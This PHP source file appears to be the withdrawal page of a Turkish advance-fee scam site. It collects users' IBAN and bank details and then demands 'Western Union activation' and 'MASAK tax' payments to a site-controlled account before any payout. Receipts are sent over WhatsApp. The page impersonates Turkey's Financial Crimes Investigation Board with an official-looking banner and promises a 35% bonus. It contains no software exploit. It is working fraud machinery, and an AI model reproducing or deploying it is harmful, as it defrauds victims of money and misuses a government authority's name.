<?php
require_once '../config.php';
requireLogin();

$user_id = $_SESSION['user_id'];
$settings = getSettings($pdo);

// Kullanıcı bilgisi
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$user_id]);
$user = $stmt->fetch();

// Mevcut western veya masak ödemesi var mı?
$stmt = $pdo->prepare("SELECT * FROM western_payments WHERE user_id = ? AND status = 'pending' ORDER BY created_at DESC LIMIT 1");
$stmt->execute([$user_id]);
$pending_western = $stmt->fetch();

$stmt = $pdo->prepare("SELECT * FROM masak_payments WHERE user_id = ? AND status = 'pending' ORDER BY created_at DESC LIMIT 1");
$stmt->execute([$user_id]);
$pending_masak = $stmt->fetch();

$western_fee = floatval($settings['western_fee'] ?? 7.5);
$masak_fee = floatval($settings['masak_fee'] ?? 15);
$masak_bonus = floatval($settings['masak_bonus'] ?? 35);

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['action'] ?? '';
    
    if ($action === 'start_withdraw') {
        $iban = sanitize($_POST['iban'] ?? '');
        $bank_name = sanitize($_POST['bank_name'] ?? '');
        $iban_holder = sanitize($_POST['iban_holder'] ?? '');
        
        if (empty($iban) || empty($bank_name) || empty($iban_holder)) {
            alert('Tüm alanları doldurun!', 'error');
        } else {
            // Kullanıcı IBAN bilgilerini güncelle
            $stmt = $pdo->prepare("UPDATE users SET iban = ?, bank_name = ?, iban_holder = ?, withdrawal_status = 'western_pending' WHERE id = ?");
            $stmt->execute([$iban, $bank_name, $iban_holder, $user_id]);
            
            // Western Union ödemesi oluştur
            $fee_amount = $user['balance'] * ($western_fee / 100);
            $stmt = $pdo->prepare("INSERT INTO western_payments (user_id, withdrawal_amount, fee_percentage, fee_amount, status) VALUES (?, ?, ?, ?, 'pending')");
            $stmt->execute([$user_id, $user['balance'], $western_fee, $fee_amount]);
            
            alert('Çekim talebi oluşturuldu. WhatsApp\'tan dekont gönderin.', 'success');
            redirect('withdraw.php');
        }
    } elseif ($action === 'western_dekont') {
        $stmt = $pdo->prepare("UPDATE western_payments SET dekont_sent = 1 WHERE user_id = ? AND status = 'pending'");
        $stmt->execute([$user_id]);
        
        alert('Dekont gönderildi olarak işaretlendi. Onay bekleniyor.', 'success');
        redirect('withdraw.php');
    } elseif ($action === 'start_masak') {
        // MASAK ödemesi oluştur
        $fee_amount = $user['balance'] * ($masak_fee / 100);
        $bonus_amount = $user['balance'] * ($masak_bonus / 100);
        $stmt = $pdo->prepare("INSERT INTO masak_payments (user_id, transfer_amount, fee_percentage, fee_amount, bonus_percentage, bonus_amount, status) VALUES (?, ?, ?, ?, ?, ?, 'pending')");
        $stmt->execute([$user_id, $user['balance'], $masak_fee, $fee_amount, $masak_bonus, $bonus_amount]);
        
        $stmt = $pdo->prepare("UPDATE users SET withdrawal_status = 'masak_pending' WHERE id = ?");
        $stmt->execute([$user_id]);
        
        redirect('withdraw.php');
    } elseif ($action === 'masak_dekont') {
        $stmt = $pdo->prepare("UPDATE masak_payments SET dekont_sent = 1 WHERE user_id = ? AND status = 'pending'");
        $stmt->execute([$user_id]);
        
        alert('Dekont gönderildi olarak işaretlendi. Onay bekleniyor.', 'success');
        redirect('withdraw.php');
    }
}

// Güncel kullanıcı bilgisini al
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$user_id]);
$user = $stmt->fetch();

$stmt = $pdo->prepare("SELECT * FROM western_payments WHERE user_id = ? ORDER BY created_at DESC LIMIT 1");
$stmt->execute([$user_id]);
$western = $stmt->fetch();

$stmt = $pdo->prepare("SELECT * FROM masak_payments WHERE user_id = ? ORDER BY created_at DESC LIMIT 1");
$stmt->execute([$user_id]);
$masak = $stmt->fetch();
?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Para Çek - <?= SITE_NAME ?></title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Inter', sans-serif; }
        .gradient-bg { background: linear-gradient(135deg, #e0f2fe 0%, #f0e6ff 50%, #ecfdf5 100%); }
        .glass { background: rgba(255, 255, 255, 0.85); backdrop-filter: blur(10px); }
    </style>
</head>
<body class="gradient-bg min-h-screen">
    <header class="glass border-b border-slate-200 sticky top-0 z-50">
        <div class="max-w-7xl mx-auto px-4 py-4 flex items-center justify-between">
            <h1 class="text-xl font-black bg-gradient-to-r from-purple-600 to-blue-600 bg-clip-text text-transparent">
                <?= SITE_NAME ?>
            </h1>
            <nav class="flex items-center gap-4">
                <a href="index.php" class="text-slate-600 hover:text-purple-600">Dashboard</a>
                <a href="withdraw.php" class="text-purple-600 font-semibold">Para Çek</a>
                <a href="../logout.php" class="text-red-500 font-semibold">Çıkış</a>
            </nav>
        </div>
    </header>
    
    <main class="max-w-2xl mx-auto px-4 py-8">
        <?php showAlert(); ?>
        
        <div class="text-center mb-8">
            <h2 class="text-3xl font-black text-slate-800 mb-2">💸 PARA ÇEKME</h2>
            <p class="text-slate-500">Kazancınızı çekin</p>
        </div>
        
        <!-- Bakiye -->
        <div class="glass rounded-2xl p-6 mb-6 shadow-lg text-center">
            <p class="text-slate-500 mb-1">Çekilebilir Bakiye</p>
            <p class="text-4xl font-black text-green-600 font-mono"><?= formatMoney($user['balance']) ?></p>
        </div>
        
        <?php if ($user['balance'] <= 0): ?>
            <div class="glass rounded-2xl p-8 text-center shadow-lg">
                <p class="text-slate-500 mb-4">Çekilebilir bakiyeniz bulunmuyor.</p>
                <a href="../index.php" class="bg-gradient-to-r from-purple-500 to-violet-600 text-white px-6 py-3 rounded-xl font-bold inline-block">
                    Kupon Satın Al
                </a>
            </div>
            
        <?php elseif ($user['withdrawal_status'] === 'completed'): ?>
            <!-- Tamamlandı -->
            <div class="glass rounded-2xl p-8 shadow-xl text-center">
                <div class="text-6xl mb-4">✅</div>
                <h3 class="text-2xl font-black text-slate-800 mb-4">TEBRİKLER!</h3>
                <p class="text-slate-600 mb-4">
                    Çekim işleminiz başarıyla tamamlandı.
                </p>
            </div>
            
        <?php elseif ($user['withdrawal_status'] === 'reviewing'): ?>
            <!-- İnceleniyor -->
            <div class="glass rounded-2xl p-8 shadow-xl text-center">
                <div class="text-6xl mb-4">⏳</div>
                <h3 class="text-2xl font-black text-slate-800 mb-4">İŞLEM İNCELENİYOR</h3>
                <p class="text-slate-600">
                    Ödemeniz alınmıştır. İşleminiz kontrol ediliyor.
                </p>
            </div>
            
        <?php elseif ($user['withdrawal_status'] === 'masak_pending' || ($masak && $masak['status'] === 'pending')): ?>
            <!-- MASAK Ödemesi -->
            <?php 
            $masak_fee_amount = $user['balance'] * ($masak_fee / 100);
            $masak_bonus_amount = $user['balance'] * ($masak_bonus / 100);
            ?>
            <div class="bg-red-600 text-white rounded-2xl overflow-hidden shadow-xl mb-6">
                <div class="p-6 text-center">
                    <h3 class="text-xl font-black">T.C. MALİ SUÇLARI ARAŞTIRMA KURULU</h3>
                    <p class="text-red-200 text-sm">MASAK PROSEDÜRÜ</p>
                </div>
            </div>
            
            <div class="glass rounded-2xl p-6 shadow-xl">
                <div class="bg-green-50 border border-green-200 rounded-xl p-4 mb-4">
                    <p class="text-red-600 font-semibold">ÖNEMLİ:</p>
                    <p class="text-slate-700">MASAK prosedürü gereği %<?= $masak_fee ?> vergi ödemeniz gerekmektedir. Ayrıca hesabınıza <span class="text-green-600 font-bold"><?= formatMoney($masak_bonus_amount) ?> BONUS</span> tanımlanacaktır.</p>
                </div>
                
                <div class="text-center mb-4">
                    <p class="text-slate-500">Ödemeniz Gereken Tutar (%<?= $masak_fee ?>)</p>
                    <p class="text-4xl font-black text-cyan-600 font-mono"><?= formatMoney($masak_fee_amount) ?></p>
                </div>
                
                <div class="bg-blue-50 rounded-xl p-4 mb-4 border border-blue-100 text-center">
                    <p class="font-semibold text-blue-700 mb-2">ÖDEME YAPILACAK HESAP</p>
                    <p class="font-bold"><?= $settings['iban_holder'] ?? '' ?></p>
                    <p class="text-slate-600 text-sm"><?= $settings['bank_name'] ?? '' ?></p>
                    <p class="font-mono text-purple-700 font-bold"><?= $settings['iban'] ?? '' ?></p>
                </div>
                
                <a href="https://wa.me/<?= $settings['whatsapp'] ?? '' ?>?text=<?= urlencode('MASAK ödememi yaptım. Dekont göndermek istiyorum. Tutar: ' . formatMoney($masak_fee_amount)) ?>" 
                   target="_blank"
                   class="block w-full bg-gradient-to-r from-green-500 to-emerald-600 text-white py-4 rounded-xl font-bold text-center mb-3">
                    📱 WhatsApp'tan Dekont Gönder
                </a>
                
                <form method="POST">
                    <input type="hidden" name="action" value="masak_dekont">
                    <button type="submit" class="w-full bg-gradient-to-r from-purple-500 to-violet-600 text-white py-4 rounded-xl font-bold">
                        DEKONT GÖNDERDİM, DEVAM ET
                    </button>
                </form>
            </div>
            
        <?php elseif ($user['withdrawal_status'] === 'western_pending' || ($western && $western['status'] === 'pending')): ?>
            <!-- Western Union Ödemesi -->
            <?php $western_fee_amount = $user['balance'] * ($western_fee / 100); ?>
            <div class="bg-amber-500 text-white rounded-t-2xl p-4 text-center font-bold shadow-lg">
                WESTERN UNION AKTİVASYON ÖDEMESİ
            </div>
            
            <div class="glass rounded-b-2xl p-6 shadow-xl">
                <div class="mb-4">
                    <p class="text-slate-600">Çekim Tutarı: <span class="font-bold"><?= formatMoney($user['balance']) ?></span></p>
                    <p class="text-red-600">Western Union Ücreti (%<?= $western_fee ?>): <span class="font-bold"><?= formatMoney($western_fee_amount) ?></span></p>
                </div>
                
                <div class="text-center mb-4">
                    <p class="text-slate-500">Ödemeniz Gereken Tutar</p>
                    <p class="text-4xl font-black text-cyan-600 font-mono"><?= formatMoney($western_fee_amount) ?></p>
                </div>
                
                <div class="bg-blue-50 rounded-xl p-4 mb-4 border border-blue-100 text-center">
                    <p class="font-semibold text-blue-700 mb-2">ÖDEME YAPILACAK HESAP</p>
                    <p class="font-bold"><?= $settings['iban_holder'] ?? '' ?></p>
                    <p class="text-slate-600 text-sm"><?= $settings['bank_name'] ?? '' ?></p>
                    <p class="font-mono text-purple-700 font-bold"><?= $settings['iban'] ?? '' ?></p>
                </div>
                
                <a href="https://wa.me/<?= $settings['whatsapp'] ?? '' ?>?text=<?= urlencode('Western Union aktivasyon ödememi yaptım. Dekont göndermek istiyorum. Tutar: ' . formatMoney($western_fee_amount)) ?>" 
                   target="_blank"
                   class="block w-full bg-gradient-to-r from-green-500 to-emerald-600 text-white py-4 rounded-xl font-bold text-center mb-3">
                    📱 WhatsApp'tan Dekont Gönder
                </a>
                
                <form method="POST">
                    <input type="hidden" name="action" value="western_dekont">
                    <button type="submit" class="w-full bg-gradient-to-r from-purple-500 to-violet-600 text-white py-4 rounded-xl font-bold">
                        DEKONT GÖNDERDİM, DEVAM ET
                    </button>
                </form>
            </div>
            
        <?php else: ?>
            <!-- IBAN Formu -->
            <div class="glass rounded-2xl p-6 shadow-xl">
                <form method="POST" class="space-y-4">
                    <input type="hidden" name="action" value="start_withdraw">
                    
                    <div>
                        <label class="block text-slate-700 text-sm font-medium mb-2">Alıcı Adı Soyadı</label>
                        <input type="text" name="iban_holder" required
                               value="<?= sanitize($user['iban_holder'] ?? '') ?>"
                               class="w-full px-4 py-3 rounded-xl border border-slate-200 focus:ring-2 focus:ring-purple-500"
                               placeholder="Ad Soyad">
                    </div>
                    
                    <div>
                        <label class="block text-slate-700 text-sm font-medium mb-2">Banka Adı</label>
                        <input type="text" name="bank_name" required
                               value="<?= sanitize($user['bank_name'] ?? '') ?>"
                               class="w-full px-4 py-3 rounded-xl border border-slate-200 focus:ring-2 focus:ring-purple-500"
                               placeholder="Banka adı">
                    </div>
                    
                    <div>
                        <label class="block text-slate-700 text-sm font-medium mb-2">IBAN Numarası</label>
                        <input type="text" name="iban" required
                               value="<?= sanitize($user['iban'] ?? '') ?>"
                               class="w-full px-4 py-3 rounded-xl border border-slate-200 focus:ring-2 focus:ring-purple-500 font-mono"
                               placeholder="TR00 0000 0000 0000 0000 0000 00">
                    </div>
                    
                    <button type="submit" class="w-full bg-gradient-to-r from-green-500 to-emerald-600 text-white py-4 rounded-xl font-bold">
                        ÇEKİM TALEBİ OLUŞTUR
                    </button>
                </form>
            </div>
        <?php endif; ?>
    </main>
</body>
</html>
